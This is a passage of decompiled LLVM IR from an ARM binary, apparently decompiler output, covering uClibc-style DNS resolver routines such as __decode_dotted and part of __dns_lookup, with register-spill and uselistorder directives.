  store i32 %v6_18654, i32* %r5.global-to-local, align 4
  ret i32 %v0_188bc

; uselistorder directives
  uselistorder i32 %v0_188bc, { 1, 0 }
  uselistorder i1 %v7_18798, { 2, 0, 1 }
  uselistorder i32 %v0_18798.pre, { 1, 0, 2 }
  uselistorder i32 %v1_18848, { 0, 2, 1 }
  uselistorder i32 %v0_18834, { 1, 0 }
  uselistorder i32 %v0_1881c, { 1, 0 }
  uselistorder i32 %v5_187c8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_187a0, { 1, 0, 2 }
  uselistorder i32 %v2_187c869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_187c471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1879868, { 1, 0 }
  uselistorder i32 %v2_18780, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_18790, { 1, 0, 2 }
  uselistorder i1 %v7_1876c, { 1, 0 }
  uselistorder i32 %v0_1876c, { 1, 2, 0 }
  uselistorder i32 %v1_18790.pre, { 2, 0, 1 }
  uselistorder i32 %v0_18764.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_18754, { 1, 0 }
  uselistorder i1 %v7_1874c, { 1, 0 }
  uselistorder i32 %v1_18740, { 1, 0 }
  uselistorder i32 %v0_18754, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18768, { 1, 2, 0, 3 }
  uselistorder i1 %v7_18708, { 1, 0 }
  uselistorder i32 %v0_18740, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_18724, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_18734, { 3, 1, 0, 2 }
  uselistorder i32 %v1_186c4, { 1, 0, 2 }
  uselistorder i32 %v2_186ac, { 1, 0 }
  uselistorder i32 %v0_186c4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_186c8, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188bc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_188a4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18848, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18798, { 1, 0 }
  uselistorder label %dec_label_pc_1876c._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1876c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18764, { 1, 0 }
  uselistorder label %dec_label_pc_18740, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1873c, { 1, 0 }
  uselistorder label %dec_label_pc_186f4, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_188d8 = load i32, i32* @r5, align 4
  %v0_188dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_188dc, i32* %sl.global-to-local, align 4
  %v2_188dc = icmp eq i32 %v0_188dc, 0
  br i1 %v2_188dc, label %.thread30, label %dec_label_pc_18904.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_189c4

dec_label_pc_18904.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_189044 = load i32, i32* @r1, align 4
  %v6_1890814 = icmp slt i32 %v0_189044, %arg2
  br i1 %v6_1890814, label %dec_label_pc_1890c.preheader, label %dec_label_pc_189c4

dec_label_pc_1890c.preheader:                     ; preds = %dec_label_pc_18904.preheader
  %v2_1890c51 = add i32 %v0_188dc, %v0_189044
  %v3_1890c52 = inttoptr i32 %v2_1890c51 to i8*
  %v4_1890c53 = load i8, i8* %v3_1890c52, align 1
  %v6_1890c54 = zext i8 %v4_1890c53 to i32
  store i32 %v6_1890c54, i32* @r4, align 4
  %v2_1891055 = icmp eq i8 %v4_1890c53, 0
  br i1 %v2_1891055, label %bb49, label %dec_label_pc_18918

dec_label_pc_18900:                               ; preds = %bb48, %bb44
  %v1_18904 = phi i32 [ %v1_18904.pre, %bb48 ], [ %v1_1893059, %bb44 ]
  %v0_18904 = phi i32 [ %v0_18904.pre, %bb48 ], [ %v5_18948, %bb44 ]
  %v0_18900 = phi i32 [ %v0_18900.pre, %bb48 ], [ %v0_1894c60, %bb44 ]
  store i32 %v0_18900, i32* %r0.global-to-local, align 4
  %v6_18908 = icmp slt i32 %v0_18904, %v1_18904
  br i1 %v6_18908, label %dec_label_pc_18900.dec_label_pc_1890c_crit_edge, label %dec_label_pc_189c4

dec_label_pc_18900.dec_label_pc_1890c_crit_edge:  ; preds = %dec_label_pc_18900
  %v0_1890c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1890c = add i32 %v0_1890c.pre, %v0_18904
  %v3_1890c = inttoptr i32 %v2_1890c to i8*
  %v4_1890c = load i8, i8* %v3_1890c, align 1
  %v6_1890c = zext i8 %v4_1890c to i32
  store i32 %v6_1890c, i32* @r4, align 4
  %v2_18910 = icmp eq i8 %v4_1890c, 0
  %v0_189b0 = load i32, i32* @ip, align 4
  %v2_189b0 = icmp eq i32 %v0_189b0, 0
  br i1 %v2_18910, label %dec_label_pc_189b0, label %dec_label_pc_18918

dec_label_pc_18918:                               ; preds = %dec_label_pc_1890c.preheader, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge
  %v2_189b066 = phi i1 [ %v2_189b0, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ false, %dec_label_pc_1890c.preheader ]
  %v0_189b064 = phi i32 [ %v0_189b0, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ 1, %dec_label_pc_1890c.preheader ]
  %v6_1890c63 = phi i32 [ %v6_1890c, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ %v6_1890c54, %dec_label_pc_1890c.preheader ]
  %v0_1893862 = phi i32 [ %v0_1890c.pre, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ %v0_188dc, %dec_label_pc_1890c.preheader ]
  %v0_1892861 = phi i32 [ %v0_18904, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ %v0_189044, %dec_label_pc_1890c.preheader ]
  %v0_1894c60 = phi i32 [ %v0_18900, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ 0, %dec_label_pc_1890c.preheader ]
  %v1_1893059 = phi i32 [ %v1_18904, %dec_label_pc_18900.dec_label_pc_1890c_crit_edge ], [ %arg2, %dec_label_pc_1890c.preheader ]
  %v1_1891c = and i32 %v6_1890c63, 192
  br i1 %v2_189b066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_18918
  %v1_18920 = load i32, i32* %r8.global-to-local, align 4
  %v2_18920 = add i32 %v1_18920, 1
  store i32 %v2_18920, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_18918, %bb
  %v2_18924 = icmp eq i32 %v1_1891c, 192
  %v1_18928 = add i32 %v0_1892861, 1
  store i32 %v1_18928, i32* %r1.global-to-local, align 4
  br i1 %v2_18924, label %dec_label_pc_18930, label %dec_label_pc_18958

dec_label_pc_18930:                               ; preds = %bb42
  %v6_18934 = icmp slt i32 %v1_18928, %v1_1893059
  br i1 %v6_18934, label %dec_label_pc_18938, label %dec_label_pc_189c4

dec_label_pc_18938:                               ; preds = %dec_label_pc_18930
  %v2_18938 = add i32 %v1_18928, %v0_1893862
  %v3_18938 = inttoptr i32 %v2_18938 to i8*
  %v4_18938 = load i8, i8* %v3_18938, align 1
  %v6_18938 = zext i8 %v4_18938 to i32
  %v1_18940 = urem i32 %v6_1890c63, 64
  br i1 %v2_189b066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_18938
  %v1_18944 = load i32, i32* %r8.global-to-local, align 4
  %v2_18944 = add i32 %v1_18944, 1
  store i32 %v2_18944, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_18938, %bb43
  %v4_18948 = mul nuw nsw i32 %v1_18940, 256
  %v5_18948 = or i32 %v6_18938, %v4_18948
  store i32 %v5_18948, i32* %r1.global-to-local, align 4
  store i32 %v0_1894c60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_18900

dec_label_pc_18958:                               ; preds = %bb42
  %v2_18958 = add i32 %v6_1890c63, %v0_1894c60
  store i32 %v2_18958, i32* %r6.global-to-local, align 4
  %v3_1895c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1895c, i32* @r3, align 4
  %v1_18960 = add i32 %v2_18958, 1
  store i32 %v1_18960, i32* %r7.global-to-local, align 4
  %v3_18964 = icmp ult i32 %v1_18960, %v3_1895c
  br i1 %v3_18964, label %dec_label_pc_1896c, label %dec_label_pc_189c4

dec_label_pc_1896c:                               ; preds = %dec_label_pc_18958
  %v2_1896c = add i32 %v6_1890c63, %v1_18928
  store i32 %v2_1896c, i32* @r5, align 4
  %v3_18970 = icmp ult i32 %v2_1896c, %v1_1893059
  br i1 %v3_18970, label %dec_label_pc_18978, label %dec_label_pc_189c4

dec_label_pc_18978:                               ; preds = %dec_label_pc_1896c
  %v2_18978 = add i32 %v1_18928, %v0_1893862
  store i32 %v2_18978, i32* @r1, align 4
  %v0_1897c = load i32, i32* %sb.global-to-local, align 4
  %v2_1897c = add i32 %v0_1897c, %v0_1894c60
  store i32 %v2_1897c, i32* @r0, align 4
  store i32 %v6_1890c63, i32* @r2, align 4
  %v0_18988 = call i32 @memcpy()
  store i32 %v0_18988, i32* %r0.global-to-local, align 4
  store i32 %v0_189b064, i32* @ip, align 4
  %v0_18990 = load i32, i32* %sl.global-to-local, align 4
  %v1_18990 = load i32, i32* @r5, align 4
  %v2_18990 = add i32 %v1_18990, %v0_18990
  %v3_18990 = inttoptr i32 %v2_18990 to i8*
  %v4_18990 = load i8, i8* %v3_18990, align 1
  br i1 %v2_189b066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_18978
  %v1_18998 = load i32, i32* %r8.global-to-local, align 4
  %v2_18998 = load i32, i32* @r4, align 4
  %v3_18998 = add i32 %v2_18998, %v1_18998
  store i32 %v3_18998, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_18978, %bb45
  %v2_1899c = icmp eq i8 %v4_18990, 0
  br i1 %v2_1899c, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_189a8.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_18990, i32* %r1.global-to-local, align 4
  %v2_189a8 = load i32, i32* %sb.global-to-local, align 4
  %v3_189a8 = load i32, i32* %r6.global-to-local, align 4
  %v4_189a8 = add i32 %v3_189a8, %v2_189a8
  %v5_189a8 = inttoptr i32 %v4_189a8 to i8*
  store i8 %v0_189a8.off0, i8* %v5_189a8, align 1
  %v0_18900.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_18904.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_18904.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18900

dec_label_pc_189b0:                               ; preds = %dec_label_pc_18900.dec_label_pc_1890c_crit_edge
  %v0_189b8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_189b0, label %dec_label_pc_189c4, label %bb49

bb49:                                             ; preds = %dec_label_pc_1890c.preheader, %dec_label_pc_189b0
  %v0_189b8.pre69 = phi i32 [ %v0_189b8.pre.pre, %dec_label_pc_189b0 ], [ 0, %dec_label_pc_1890c.preheader ]
  %v2_189b4 = add i32 %v0_189b8.pre69, 1
  store i32 %v2_189b4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_189c4

dec_label_pc_189c4:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_18958, %dec_label_pc_18930, %dec_label_pc_18900, %dec_label_pc_189b0, %dec_label_pc_18904.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_189b4, %bb49 ], [ -1, %dec_label_pc_18904.preheader ], [ %v0_189b8.pre.pre, %dec_label_pc_189b0 ], [ -1, %dec_label_pc_18958 ], [ -1, %dec_label_pc_1896c ], [ -1, %dec_label_pc_18900 ], [ -1, %dec_label_pc_18930 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_188d8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_189b8.pre.pre, { 1, 0 }
  uselistorder i32 %v1_18990, { 1, 0 }
  uselistorder i32 %v5_18948, { 1, 0 }
  uselistorder i32 %v1_18928, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1894c60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1890c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_189b066, { 1, 2, 0 }
  uselistorder i32 %v0_188dc, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_189c4, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_18918, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_189d0 = load i32, i32* @r4, align 4
  %v6_189d0 = load i32, i32* @r5, align 4
  %v9_189d0 = load i32, i32* @r6, align 4
  %v12_189d0 = load i32, i32* @r7, align 4
  %v15_189d0 = load i32, i32* @r8, align 4
  %v18_189d0 = load i32, i32* @sb, align 4
  %v21_189d0 = load i32, i32* @sl, align 4
  %v24_189d0 = load i32, i32* @fp, align 4
  %v27_189d0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_189e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_189ec = call i32 @malloc(i32 512)
  store i32 %v1_189ec, i32* @sl, align 4
  %v0_189f4 = load i32, i32* @r4, align 4
  %v1_189f4 = inttoptr i32 %v0_189f4 to i8*
  %v3_189f8 = call i32 @strlen(i8* %v1_189f4)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_18a04 = icmp ugt i32 %v3_189f8, 893
  store i1 %v3_18a04, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_189f8, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_18a24

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19134

dec_label_pc_18a24:                               ; preds = %entry
  %v1_18a28 = add i32 %v3_189f8, 130
  %v1_18a2c = call i32 @malloc(i32 %v1_18a28)
  store i32 %v1_18a2c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a30 = icmp eq i32 %v1_18a2c, 0
  br i1 %v2_18a30, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_18a24
  %v1_18a34 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_18a34 = icmp eq i32 %v1_18a34, 0
  br i1 %v3_18a34, label %bb213, label %dec_label_pc_18a48

.thread5:                                         ; preds = %dec_label_pc_18a24
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1912c

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1912c

dec_label_pc_18a48:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_18a48 = load i32, i32* @r4, align 4
  %v1_18a48 = inttoptr i32 %v0_18a48 to i8*
  %v2_18a48 = load i8, i8* %v1_18a48, align 1
  %v3_18a48 = zext i8 %v2_18a48 to i32
  store i32 %v3_18a48, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a4c = icmp eq i8 %v2_18a48, 0
  br i1 %v2_18a4c, label %dec_label_pc_1912c, label %dec_label_pc_18a54

dec_label_pc_18a54:                               ; preds = %dec_label_pc_18a48
  %v2_18a58 = add i32 %v0_18a48, %v3_189f8
  store i32 %v2_18a58, i32* %r3.global-to-local, align 4
  %v1_18a5c = add i32 %v2_18a58, -1
  %v2_18a5c = inttoptr i32 %v1_18a5c to i8*
  %v3_18a5c = load i8, i8* %v2_18a5c, align 1
  %v4_18a5c = zext i8 %v3_18a5c to i32
  store i32 %v4_18a5c, i32* @r3, align 4
  store i32 %v3_189f8, i32* @r2, align 4
  store i32 %v0_18a48, i32* @r1, align 4
  %v0_18a6c = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 30356, i32* %ip.global-to-local, align 4
  store i32 29320, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_18ae8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_18c00 = ptrtoint i16* %stack_var_-104 to i32
  %v15_18c04 = ptrtoint i32* %stack_var_-88 to i32
  %v2_18c28 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18c48 = bitcast i32* %stack_var_-192 to i8*
  %v2_18cfc = ptrtoint i32* %stack_var_-48 to i32
  %v2_18d08 = ptrtoint i32* %stack_var_-56 to i32
  %v2_18d94 = icmp eq i32 %tmp161, 0
  %v1_18da0 = add i32 %tmp160, -2
  %v2_18da4 = icmp ne i32 %v1_18da0, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_18e90 = ptrtoint i32* %stack_var_-448 to i32
  %v2_18e94 = ptrtoint i32* %stack_var_-144 to i32
  %v5_190d856 = icmp sgt i32 %tmp159, 0
  %v2_19000 = icmp ne i32 %v0_189e4, 0
  %v7_19000 = icmp eq i32 %v0_189e4, 1
  %v1_18ef4 = bitcast i32* %stack_var_-448 to i8*
  %v2_18fa8 = icmp eq i32 %tmp144, 0
  %v2_18db0 = icmp ugt i8 %v3_18a5c, 45
  %v7_18db0 = icmp eq i8 %v3_18a5c, 46
  %v1_18b5c = add i32 %v1_18a2c, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_18b3c = add i32 %v1_18a2c, %v3_189f8
  %v5_18b3c = inttoptr i32 %v4_18b3c to i8*
  %v1_18da0.cmp = icmp ugt i32 %v1_18da0, 1
  %v2_18dd8 = icmp eq i32 %tmp160, 0
  %v3_19004 = icmp ugt i32 %v0_189e4, 27
  %v8_19004 = icmp eq i32 %v0_189e4, 28
  br label %dec_label_pc_18acc

dec_label_pc_18acc:                               ; preds = %dec_label_pc_19114, %dec_label_pc_18a54
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_18a54 ], [ %v1_19118, %dec_label_pc_19114 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_18a54 ], [ %v3_18be0, %dec_label_pc_19114 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_18a54 ], [ %stack_var_-468.2, %dec_label_pc_19114 ]
  %v1_18ad4 = phi i32 [ -1, %dec_label_pc_18a54 ], [ %v3_18cb4, %dec_label_pc_19114 ]
  store i32 %v1_18ad4, i32* %r3.global-to-local, align 4
  %v2_18ad0 = icmp eq i32 %v1_18ad4, -1
  store i1 %v2_18ad0, i1* %cpsr_c.global-to-local, align 1
  %v7_18ad0 = icmp eq i32 %v1_18ad4, -1
  br i1 %v7_18ad0, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_18acc
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_18acc, %bb215
  %v1_18ad8 = xor i1 %v7_18ad0, true
  call void @__pseudo_cond_branch(i1 %v1_18ad8, i32 ptrtoint (i32* @global_var_fb04.935 to i32))
  store i32 36, i32* @r7, align 4
  %v0_18ae4 = load i32, i32* @r8, align 4
  %v2_18ae4 = add i32 %v0_18ae4, 40
  %v3_18ae4 = inttoptr i32 %v2_18ae4 to i32*
  %v4_18ae4 = load i32, i32* %v3_18ae4, align 4
  store i32 %v4_18ae4, i32* @r4, align 4
  store i32 %v2_18ae8, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_18af4 = add i32 %v0_18ae4, 36
  %v3_18af4 = inttoptr i32 %v2_18af4 to i32*
  %v4_18af4 = load i32, i32* %v3_18af4, align 4
  store i32 %v4_18af4, i32* %r1.global-to-local, align 4
  %v2_18afc = add i32 %v0_18ae4, 76
  %v3_18afc = inttoptr i32 %v2_18afc to i32*
  %v4_18afc = load i32, i32* %v3_18afc, align 4
  store i32 %v4_18afc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18afc)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_18b10 = load i32, i32* @r8, align 4
  %v2_18b10 = add i32 %v0_18b10, 16
  %v3_18b10 = inttoptr i32 %v2_18b10 to i32*
  %v4_18b10 = load i32, i32* %v3_18b10, align 4
  store i32 %v4_18b10, i32* %ip.global-to-local, align 4
  store i32 101148, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18b10)
  %v0_18b1c = call i32 @__open_nameservers()
  %v0_18b24 = load i32, i32* @r8, align 4
  %v2_18b24 = add i32 %v0_18b24, 30368
  %v3_18b24 = inttoptr i32 %v2_18b24 to i32*
  %v4_18b24 = load i32, i32* %v3_18b24, align 4
  store i32 %v1_18a2c, i32* %r3.global-to-local, align 4
  store i32 %v3_189f8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_18b34 = load i32, i32* @sb, align 4
  %v3_18b34 = icmp uge i32 %v0_18b34, %v4_18b24
  store i1 %v3_18b34, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_18b3c, align 1
  %v0_18b40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18b40, label %dec_label_pc_18b6c, label %dec_label_pc_18b44

dec_label_pc_18b44:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_18b4c = load i32, i32* %ip.global-to-local, align 4
  %v4_18b4c = add i32 %v3_18b4c, %v1_18a2c
  %v5_18b4c = inttoptr i32 %v4_18b4c to i8*
  store i8 46, i8* %v5_18b4c, align 1
  store i32 30356, i32* %r1.global-to-local, align 4
  %v0_18b58 = load i32, i32* @r8, align 4
  %v2_18b58 = add i32 %v0_18b58, 30356
  %v3_18b58 = inttoptr i32 %v2_18b58 to i32*
  %v4_18b58 = load i32, i32* %v3_18b58, align 4
  store i32 %v4_18b58, i32* %r3.global-to-local, align 4
  %v1_18b60 = load i32, i32* %ip.global-to-local, align 4
  %v2_18b60 = add i32 %v1_18b5c, %v1_18b60
  %v1_18b64 = load i32, i32* @sb, align 4
  %v2_18b64 = and i32 %v1_18b64, 1073741824
  %v3_18b64 = icmp ne i32 %v2_18b64, 0
  store i1 %v3_18b64, i1* %cpsr_c.global-to-local, align 1
  %v4_18b64 = mul i32 %v1_18b64, 4
  %v5_18b64 = add i32 %v4_18b64, %v4_18b58
  %v6_18b64 = inttoptr i32 %v5_18b64 to i32*
  %v7_18b64 = load i32, i32* %v6_18b64, align 4
  store i32 %v7_18b64, i32* @r1, align 4
  %v2_18b68 = inttoptr i32 %v2_18b60 to i8*
  %v3_18b68 = call i32 @strcpy(i8* %v2_18b68, i32 %v7_18b64)
  br label %dec_label_pc_18b6c

dec_label_pc_18b6c:                               ; preds = %bb216, %dec_label_pc_18b44
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18b70 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_18b70, label %dec_label_pc_18b78, label %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge

dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge:  ; preds = %dec_label_pc_18b6c
  %v0_18bb0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_18ba8

dec_label_pc_18b78:                               ; preds = %dec_label_pc_18b6c
  store i32 30364, i32* %r3.global-to-local, align 4
  store i32 4127, i32* %ip.global-to-local, align 4
  %v0_18b80 = load i32, i32* @r8, align 4
  %v2_18b80 = add i32 %v0_18b80, 30364
  %v3_18b80 = inttoptr i32 %v2_18b80 to i32*
  %v4_18b80 = load i32, i32* %v3_18b80, align 4
  %v2_18b84 = add i32 %v0_18b80, 4127
  %v3_18b84 = inttoptr i32 %v2_18b84 to i8*
  %v4_18b84 = load i8, i8* %v3_18b84, align 1
  %v6_18b84 = zext i8 %v4_18b84 to i32
  %v2_18b88 = mul i32 %v6_18b84, %v4_18b80
  store i32 %v2_18b88, i32* %r3.global-to-local, align 4
  store i32 29320, i32* %r1.global-to-local, align 4
  %v2_18b94 = add i32 %v0_18b80, 4124
  %v3_18b94 = inttoptr i32 %v2_18b94 to i16*
  %v4_18b94 = load i16, i16* %v3_18b94, align 2
  %v6_18b94 = zext i16 %v4_18b94 to i32
  %v2_18b98 = add i32 %v0_18b80, 29320
  %v3_18b98 = inttoptr i32 %v2_18b98 to i32*
  %v4_18b98 = load i32, i32* %v3_18b98, align 4
  store i32 %v4_18b98, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge, %dec_label_pc_18b78
  %v2_18bec = phi i32 [ %v0_18b80, %dec_label_pc_18b78 ], [ %v0_18bb0.pre, %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_18b94, %dec_label_pc_18b78 ], [ %stack_var_-464.0, %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_18b98, %dec_label_pc_18b78 ], [ %stack_var_-468.0, %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_18b88, %dec_label_pc_18b78 ], [ %stack_var_-476.0, %dec_label_pc_18b6c.dec_label_pc_18ba8_crit_edge ]
  store i32 30364, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_18bb0 = add i32 %v2_18bec, 30364
  %v3_18bb0 = inttoptr i32 %v2_18bb0 to i32*
  %v4_18bb0 = load i32, i32* %v3_18bb0, align 4
  store i32 30360, i32* %r3.global-to-local, align 4
  %v3_18bb8 = icmp uge i32 %stack_var_-468.1, %v4_18bb0
  store i1 %v3_18bb8, i1* %cpsr_c.global-to-local, align 1
